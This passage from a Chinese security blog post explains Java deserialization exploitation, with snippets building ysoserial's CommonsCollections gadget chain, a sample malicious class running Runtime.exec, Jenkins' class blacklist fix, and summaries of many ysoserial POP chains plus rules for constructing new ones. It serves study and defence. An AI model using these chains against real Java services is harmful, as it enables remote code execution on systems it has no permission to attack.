<p>首先，<code>memberTypes</code>是<code>AnnotationType</code>的一个字段，里面存储着<code>Annotation</code>接口声明的方法信息 <em>（键名为方法名，值为方法返回类型）</em> 。因此，我们在获取<code>AnnotationInvocationHandler</code>实例时，需要传入一个方法个数大于0的<code>Annotation</code>子类 <em>（一般来说，若方法个数大于0，都会包含一个名为<code>value</code>的方法）</em> ，并且原始<code>Map</code>中必须存在任意以这些方法名为键名的元素，且元素值不是该方法返回类型的实例，才能顺利进入<code>setValue()</code>的流程：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">m</span>)</span>;</span><br></pre></td></tr></table></figure></div>

<p>以上是<code>TransformedMap</code>的利用构造过程。而ysoserial官方更倾向于使用<code>LazyMap</code>作为装饰器，它在装饰时会传入原始<code>Map</code>和一个<code>Transformer</code>作为工厂，当<code>get()</code>获取值时，若键不存在，就会调用工厂的<code>transform()</code>创建一个新值放入<code>Map</code>中，因此装饰任意一个空<code>Map</code>也可以满足需求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = LazyMap.decorate(<span class="keyword">new</span> HashMap(), chain);</span><br></pre></td></tr></table></figure></div>

<p>但与<code>TransformedMap</code>不同的是，<code>AnnotationInvocationHandler.readObject()</code>中并没有直接的对<code>memberTypes</code>执行<code>get()</code>操作，反而是在它的<code>invoke()</code>中存在<code>get()</code>，但又对方法名有一定的要求：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">        return equalsImpl(args[0]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"toString"</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"hashCode"</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"annotationType"</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以，ysoserial使用Java动态代理的方式处理了 <code>LazyMap</code> ，使 <code>readObject()</code>在调用<code>memberValues.entrySet()</code> 时代理进入<code>AnnotationInvocationHandler.invoke()</code>阶段，刚好方法名<code>entrySet</code>也可以顺利的跳过前面的几个判断条件，最终达到目的。这也是为什么Payload中会包含两个<code>AnnotationInvocationHandler</code>的原因。</p>
<hr>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>Jenkins在1.638版本的 <code>Connection.readObject()</code> 中，将默认的<code>ObjectInputStream</code>改为了其自定义的子类<code>ObjectInputStreamEx</code>，并传入<code>ClassFilter.DEFAULT</code>校验过滤：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStreamEx(in,</span><br><span class="line">            getClass().getClassLoader(), ClassFilter.DEFAULT);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>ClassFilter.DEFAULT</code> 长这样：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> ClassFilter DEFAULT = <span class="keyword">new</span> ClassFilter() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isBlacklisted</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">"org.codehaus.groovy.runtime."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.startsWith(<span class="string">"org.apache.commons.collections.functors."</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name.contains(<span class="string">"org.apache.xalan"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>还是一个简简单单的黑名单。</p>
<h2 id="POP的艺术"><a href="#POP的艺术" class="headerlink" title="POP的艺术"></a>POP的艺术</h2><p>既然反序列化漏洞常见的修复方案是黑名单，就存在被绕过的风险，一旦出现新的POP链，原来的防御也就直接宣告无效了。</p>
<p>所以在反序列化漏洞的对抗史中，除了有大佬不断的挖掘新的反序列化漏洞点，更有大牛不断的探寻新的POP链。</p>
<p>POP已经成为反序列化区别于其他常规Web安全漏洞的一门特殊艺术。</p>
<p>既然如此，我们就用ysoserial这个项目，来好好探究一下现在常用的这些RCE类POP中到底有什么乾坤：</p>
<h3 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code> 反序列化所有元素后，通过<code>comparator.compare()</code>进行排序，该<code>comparator</code>被代理给<code>XThis.Handler</code>处理，其<code>invoke()</code>会调用<code>This.invokeMethod()</code>从<code>Interpreter</code>解释器中解析包含恶意代码的<code>compare</code>方法并执行</p>
<h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p><font color="#0099ff">命令执行载体：</font><code>bsh.Interpreter</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>com.mchange.v2.c3p0.PoolBackedDataSource</code></p>
<p><code>PoolBackedDataSource.readObject()</code>进行到父类<code>PoolBackedDataSourceBase.readObject()</code>阶段，会调用<code>ReferenceIndirector$ReferenceSerialized.getObject()</code>获取对象，其中<code>InitialContext.lookup()</code>会去加载远程恶意对象并初始化，导致命令执行，有些同学可能不太清楚远程恶意对象的长相，举个简单的例子：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Malicious</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Malicious</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><p><font color="#0099ff">命令执行载体：</font><code>clojure.core$comp$fn__4727</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>反序列化各元素时，通过它的<code>hashCode()</code>得到hash值，而<code>AbstractTableModel$ff19274a.hashCode()</code>会从<code>IPersistentMap</code>中取<code>hashCode</code>键的值对象调用其<code>invoke()</code>，最终导致Clojure Shell命令字符串执行</p>
<hr>
<h3 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>BeanComparator.compare()</code>会根据<code>BeanComparator.property</code> <em>（值为<code>outputProperties</code>）</em> 调用<code>TemplatesImpl.getOutputProperties()</code>，它在<code>newTransformer()</code>时会创建<code>AbstractTranslet</code>实例，导致精心构造的Java字节码被执行</p>
<h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code><br>见前文</p>
<h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>InvokerTransformer.transform()</code>转换元素，进而获取第一个元素<code>TemplatesImpl</code>的<code>newTransformer()</code>并调用，最终导致命令执行</p>
<h3 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p>
<p>除<code>Transformer</code>数组元素组成不同外，与CommonsCollections1基本一致</p>
<h3 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>PriorityQueue</code></p>
<p><code>PriorityQueue.readObject()</code>执行排序时，<code>TransformingComparator.compare()</code>会调用<code>ChainedTransformer.transform()</code>转换元素，进而遍历执行<code>Transformer</code>数组中的每个元素，最终导致命令执行</p>
<h3 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p>
<p><code>BadAttributeValueExpException.readObject()</code>当<code>System.getSecurityManager()</code>为<code>null</code>时，会调用<code>TiedMapEntry.toString()</code>，它在<code>getValue()</code>时会通过<code>LazyMap.get()</code>取值，最终导致命令执行</p>
<h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.commons.collections.functors.ChainedTransformer</code><br><font color="#0099ff">反序列化载体：</font><code>HashSet</code><br><code>HashSet.readObject()</code>反序列化各元素后，会调用<code>HashMap.put()</code>将结果放进去，而它通过<code>TiedMapEntry.hashCode()</code>计算hash时，会调用<code>getValue()</code>触发<code>LazyMap.get()</code>导致命令执行</p>
<hr>
<h3 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.codehaus.groovy.runtime.MethodClosure</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>AnnotationInvocationHandler</code></p>
<p><code>AnnotationInvocationHandler.readObject()</code>在通过<code>memberValues.entrySet()</code>获取<code>Entry</code>集合，该<code>memberValues</code>被代理给<code>ConvertedClosure</code>拦截<code>entrySet</code>方法，根据<code>MethodClosure</code>的构造最终会由<code>ProcessGroovyMethods.execute()</code>执行系统命令</p>
<h3 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>TypedValue.hashCode()</code>计算hash时，<code>ComponentType.getPropertyValue()</code>会调用<code>PojoComponentTuplizer.getPropertyValue()</code>获取到<code>TemplatesImpl.getOutputProperties</code>方法并调用导致命令执行</p>
<h3 id="Hibernate2"><a href="#Hibernate2" class="headerlink" title="Hibernate2"></a>Hibernate2</h3><p><font color="#0099ff">命令执行载体：</font><code>com.sun.rowset.JdbcRowSetImpl</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code><br>执行过程与Hibernate1一致，但Hibernate2并不是传入<code>TemplatesImpl</code>执行系统命令，而是利用<code>JdbcRowSetImpl.getDatabaseMetaData()</code>调用<code>connect()</code>连接到远程RMI</p>
<hr>
<h3 id="JBossInterceptors1"><a href="#JBossInterceptors1" class="headerlink" title="JBossInterceptors1"></a>JBossInterceptors1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.jboss.interceptor.proxy.InterceptorMethodHandler</code></p>
<p><code>InterceptorMethodHandler.readObject()</code>在<code>executeInterception()</code>时，会根据<code>SimpleInterceptorMetadata</code>拿到<code>TemplatesImpl</code>放进<code>ArrayList</code>中，并传入<code>SimpleInterceptionChain</code>进行初始化，它在调用<code>invokeNextInterceptor()</code>时会导致命令执行</p>
<h3 id="JSON1"><a href="#JSON1" class="headerlink" title="JSON1"></a>JSON1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>将各元素放进<code>HashMap</code>时，会调用<code>TabularDataSupport.equals()</code>进行比较，它的<code>JSONObject.containsValue()</code>获取对象后在<code>PropertyUtils.getProperty()</code>内动态调用<code>getOutputProperties</code>方法，它被代理给<code>CompositeInvocationHandlerImpl</code>，其中转交给<code>JdkDynamicAopProxy.invoke()</code>，在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.target</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p>
<h3 id="JavassistWeld1"><a href="#JavassistWeld1" class="headerlink" title="JavassistWeld1"></a>JavassistWeld1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.jboss.weld.interceptor.proxy.InterceptorMethodHandler</code></p>
<p>除JBoss部分包名存在差异外，与JBossInterceptors1基本一致</p>
<h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>LinkedHashSet</code></p>
<p><code>LinkedHashSet.readObject()</code>将各元素放进<code>HashMap</code>时，第二个元素会调用<code>equals()</code>与第一个元素进行比较，它被代理给<code>AnnotationInvocationHandler</code>进入<code>equalsImpl()</code>，在<code>getMemberMethods()</code>遍历<code>TemplatesImpl</code>的方法遇到<code>getOutputProperties</code>进行调用时，导致命令执行</p>
<hr>
<h3 id="MozillaRhino1"><a href="#MozillaRhino1" class="headerlink" title="MozillaRhino1"></a>MozillaRhino1</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p> <font color="#0099ff">反序列化载体：</font><code>BadAttributeValueExpException</code></p>
<p> <code>BadAttributeValueExpException.readObject()</code>调用<code>NativeError.toString()</code>时，会在<code>ScriptableObject.getProperty()</code>中进入<code>getImpl()</code>，<code>ScriptableObject$Slot</code>根据<code>name</code>获取到封装了<code>Context.enter</code>方法的<code>MemberBox</code>，并通过它的<code>invoke()</code>完成调用，而之后根据<code>message</code>调用<code>TemplatesImpl.newTransformer()</code>则会导致命令执行</p>
<h3 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>ValueExpressionMethodExpression.hashCode()</code>计算hash时，会由<code>getMethodExpression()</code>调用<code>ValueExpression.getValue()</code>，最终导致EL表达式执行</p>
<h3 id="Myfaces2"><a href="#Myfaces2" class="headerlink" title="Myfaces2"></a>Myfaces2</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression</code><br><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p>执行过程与Myfaces1一致，但Myfaces2的EL表达式并不是由使用者传入的，而是预制了一串加载远程恶意对象的表达式</p>
<h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>通过<code>ObjectBean.hashCode()</code>计算hash时，会在<code>ToStringBean.toString()</code>阶段遍历<code>TemplatesImpl</code>所有字段的Setter和Getter并调用，当调用到<code>getOutputProperties()</code>时将导致命令执行</p>
<hr>
<h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><p><font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在调用<code>TypeProvider.getType()</code>时被代理给<code>AnnotationInvocationHandler</code>得到另一个Handler为<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>的代理，之后传给<code>ReflectionUtils.invokeMethod()</code>动态调用<code>newTransformer</code>方法时被第二个代理拦截，它的<code>objectFactory</code>字段是第三个代理，因此<code>objectFactory.getObject()</code>会获得<code>TemplatesImpl</code>，最终导致命令执行</p>
<h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><p> <font color="#0099ff">命令执行载体：</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">反序列化载体：</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p> <code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>在动态调用<code>newTransformer</code>方法时，被第二个代理拦截交给<code>JdkDynamicAopProxy</code>，它在<code>AopUtils.invokeJoinpointUsingReflection()</code>时会传入从<code>AdvisedSupport.targetSource</code>字段中取出来的<code>TemplatesImpl</code>，最终导致命令执行</p>
<p>根据上面这些内容，我们可以得到几条简单的POP构造法则：</p>
<ol>
<li>当依赖中不存在可以执行命令的方法时，可以选择使用<code>TemplatesImpl</code>作为命令执行载体，并想办法去触发它的<code>newTransformer</code>或<code>getOutputProperties</code>方法</li>
<li>可以作为入口的通用反序列化载体是<code>HashMap</code>、<code>AnnotationInvocationHandler</code>、<code>BadAttributeValueExpException</code>和<code>PriorityQueue</code>，它们都是依赖较少的JDK底层对象，区别如下：<ul>
<li><code>HashMap</code>，可以主动触发元素的<code>hashCode</code>和<code>equals</code>方法</li>
<li><code>AnnotationInvocationHandler</code>，可以主动触发<code>memberValues</code>字段的<code>setValue</code>方法，本身也可以作为动态代理的Handler拦截如<code>Map.entrySet</code>等方法进入自己的<code>invoke</code>方法</li>
<li><code>BadAttributeValueExpException</code>，可以主动触发<code>val</code>字段的<code>toString</code>方法</li>
<li><code>PriorityQueue</code>，可以主动触发<code>comparator</code>字段的<code>compare</code>方法</li>
</ul>
</li>
</ol>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>历年来，很多流行的Java组件框架都被爆出过反序列化漏洞，这已经有好多大牛们都进行过分析总结了，本文的主要目的也不在此，而是为了去深挖反序列化漏洞底层一些可能还没有被唤醒的地方。</p>
<p>不过有一点要切记，反序列化不止RCE。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://docs.oracle.com/javase/8/docs/" target="_blank" rel="noopener">JavaSE Document</a></li>
<li><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">Java OpenJDK Source Code</a></li>
<li><a href="https://github.com/unofficial-openjdk/openjdk/" target="_blank" rel="noopener">Java OpenJDK GitHub Mirror</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">晓黑</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.suk1.top/2020/02/28/about-java-serialization-and-deserialization/">https://www.suk1.top/2020/02/28/about-java-serialization-and-deserialization/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.suk1.top">Manayakko - 微笑才是王道</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/yakko1216.github.io/tags/code-audit/">code audit    </a></div><div class="post_share"><div class="social-share" data-image="/img/index2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/yakko1216.github.io/img/Wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/yakko1216.github.io/2020/03/02/PTAbasic/"><img class="prev_cover lazyload" data-src="/img/index2.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>PTA a题</span></div></a></div><div class="next-post pull_right"><a href="/yakko1216.github.io/2020/02/28/pySpider/"><img class="next_cover lazyload" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pkbp7z9j30j60f13zy.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>Python 爬虫学习记录</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/yakko1216.github.io/2019/04/05/Bugkuctf/" title="Bugku吹头发 writeup（慢慢更）"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/6b8c14f8gy1fvcdnepp5yj218g0tn48s.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2019-04-05</div><div class="relatedPosts_title">Bugku吹头发 writeup（慢慢更）</div></div></a></div><div class="relatedPosts_item"><a href="/yakko1216.github.io/2020/02/05/GXY套娃/" title="通过一道题学习无参数RCE"><img class="relatedPosts_cover lazyload"data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/taowa.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-02-05</div><div class="relatedPosts_title">通过一道题学习无参数RCE</div></div></a></div><div class="relatedPosts_item"><a href="/yakko1216.github.io/2019/01/22/PHP弱类型总结/" title="PHP code audit"><img class="relatedPosts_cover lazyload"data-src="/img/index2.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2019-01-22</div><div class="relatedPosts_title">PHP code audit</div></div></a></div></div><div class="clear_both"></div></div></div></main><footer id="footer" style="background-image: url(/img/index2.jpg)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By 晓黑</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="icp"><a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener"><img class="icp-icon" src="/yakko1216.github.io/img/icp.png"><span>湘ICP备20004980号-1</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/yakko1216.github.io/js/utils.js"></script><script src="/yakko1216.github.io/js/main.js"></script><script src="/yakko1216.github.io/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>$(function () {
  $('span.katex-display').wrap('<div class="katex-wrap"></div>')
